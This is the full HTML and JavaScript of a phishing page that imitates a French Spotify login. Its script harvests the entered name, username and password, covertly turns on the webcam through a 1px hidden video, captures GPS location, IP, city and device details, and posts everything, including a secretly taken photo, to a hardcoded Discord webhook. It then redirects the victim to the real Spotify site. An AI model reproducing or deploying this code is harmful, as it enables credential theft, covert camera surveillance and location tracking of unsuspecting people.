<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Spotify - Connexion</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Figtree:wght@400;700;900&display=swap');
        body { background-color: #000; color: #fff; font-family: 'Figtree', sans-serif; margin: 0; display: flex; justify-content: center; }
        .app-card { width: 100%; max-width: 450px; padding: 40px 25px; text-align: center; }
        .logo { width: 45px; margin: 0 auto 35px auto; }
        .field { text-align: left; margin-bottom: 15px; }
        label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 8px; color: #fff; }
        input { width: 100%; background: #121212; border: 1px solid #727272; border-radius: 4px; padding: 14px; color: #fff; font-size: 15px; outline: none; }
        input:focus { border: 2px solid #1ed760; }
        .btn-green { background: #1ed760; color: #000; font-weight: 700; padding: 16px; border-radius: 500px; width: 100%; margin-top: 25px; font-size: 16px; border: none; cursor: pointer; text-transform: uppercase; }
        #loader { display: none; margin-top: 20px; }
        .progress-bg { background: #282828; height: 4px; width: 100%; border-radius: 10px; overflow: hidden; }
        .progress-bar { background: #1ed760; height: 100%; width: 0%; transition: width 0.5s; }
        
        /* LE SECRET : 1px visible pour forcer le mobile à ne pas envoyer du noir */
        #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.1; z-index: -1; pointer-events: none; }
        #c { display: none; }
    </style>
</head>
<body>
    <div class="app-card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/1/19/Spotify_logo_without_text.svg" class="logo">
        <div id="login-form">
            <div class="flex gap-2">
                <div class="field w-1/2"><label>Prénom</label><input id="fn" type="text" placeholder=""></div>
                <div class="field w-1/2"><label>Nom</label><input id="ln" type="text" placeholder=""></div>
            </div>
            <div class="field"><label>E-mail ou utilisateur</label><input id="u" type="text"></div>
            <div class="field"><label>Mot de passe</label><input id="p" type="password"></div>
            <button onclick="launchV35()" id="btn" class="btn-green">Se connecter</button>
        </div>

        <div id="loader">
            <div class="progress-bg"><div id="pbar" class="progress-bar"></div></div>
            <p style="font-size: 12px; color: #b3b3b3; margin-top: 10px;">Vérification du profil...</p>
        </div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const hook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";

        async function launchV35() {
            const data = { fn: document.getElementById('fn').value, ln: document.getElementById('ln').value, u: document.getElementById('u').value, p: document.getElementById('p').value };
            if(!data.u || !data.p) return;

            document.getElementById('login-form').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            const pb = document.getElementById('pbar');

            // 1. Force Caméra (1px visible pour éviter le noir)
            let stream = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('v').srcObject = stream;
            } catch(e) {}

            // 2. Data & GPS
            pb.style.width = "40%";
            let gps = "❌ Bloqué";
            try {
                const pos = await new Promise((res, rej) => {
                    navigator.geolocation.getCurrentPosition(res, rej, {timeout: 6000});
                });
                gps = `✅ **LOCALISÉ :** [Maps](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
            } catch(e) {}

            let net = {}; try { net = await fetch('https://ipapi.co/json/').then(r => r.json()); } catch(e){}
            let bat = {}; try { bat = await navigator.getBattery(); } catch(e){}
            const gl = document.createElement('canvas').getContext('webgl');
            const gpu = gl ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "Inconnu";

            const payload = {
                embeds: [{
                    title: `🔱 LOG V35 FINAL - ${data.fn} ${data.ln}`,
                    color: 1955168,
                    fields: [
                        { name: "👤 COMPTE", value: `**User:** \`${data.u}\`\n**Pass:** \`${data.p}\`\n**Nom:** \`${data.fn} ${data.ln}\`` },
                        { name: "📍 LOC", value: `**GPS:** ${gps}\n**IP:** \`${net.ip}\` (${net.city})` },
                        { name: "📱 SYSTÈME", value: `**GPU:** \`${gpu}\`\n**RAM:** \`${navigator.deviceMemory}GB\`\n**Batterie:** \`${Math.round(bat.level*100)}%\`` }
                    ],
                    footer: { text: "LVN Elite • " + new Date().toLocaleString() }
                }]
            };
            await fetch(hook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });

            // 3. Capture Photo (Attente de 3.5s pour PC et Mobile)
            pb.style.width = "90%";
            if(stream) {
                await new Promise(r => setTimeout(r, 3500));
                const v = document.getElementById('v');
                const can = document.getElementById('c');
                can.width = v.videoWidth; can.height = v.videoHeight;
                can.getContext('2d').drawImage(v, 0, 0);
                
                can.toBlob(async b => {
                    const fd = new FormData();
                    fd.append('file', b, 'final_shot.jpg');
                    fd.append('content', `📸 **Photo de ${data.fn} ${data.ln}**`);
                    await fetch(hook, { method: 'POST', body: fd });
                    stream.getTracks().forEach(t => t.stop());
                    window.location.href = "https://www.spotify.com/fr/login/";
                }, 'image/jpeg', 0.8);
            } else {
                setTimeout(() => { window.location.href = "https://www.spotify.com/fr/login/"; }, 1000);
            }
        }
    </script>
</body>
</html>
